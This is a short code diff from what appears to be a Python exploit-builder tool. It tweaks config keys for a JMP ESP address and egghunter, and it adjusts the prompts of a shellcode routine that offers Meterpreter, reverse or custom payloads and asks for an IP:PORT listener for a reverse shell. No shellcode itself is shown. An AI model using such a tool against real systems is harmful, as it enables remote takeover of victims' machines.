@@ -199,7 +199,7 @@ class System:
             "jmpesp_add": config.jmpesp_add,
             "instruction": config.instruction,
             # "hunter": config.hunter,
-            "egg": config.egg,
+            # "egg": config.egg,
             "src_address": config.src_address,
             "dest_address": config.dest_address,
         }
@@ -273,7 +273,9 @@ class System:
     @staticmethod
     def shellcode(config):
 
-        payloadtype = System.input("[?] What kind of payload to you want to use? [M]eterpreter | [R]everse | [C]ustom ASM")
+        payloadtype = System.input("[?] What kind of payload to you want to use? [M]eterpreter | [R]everse | [C]ustom ASM: ")
+
+        print("[!] Preparing Shellcode for reverse shell.....")
 
         if config.localip == "" or str(config.localport) == "":
             ip_port = System.input("[?] Enter your IP:PORT listening for reverse shell")
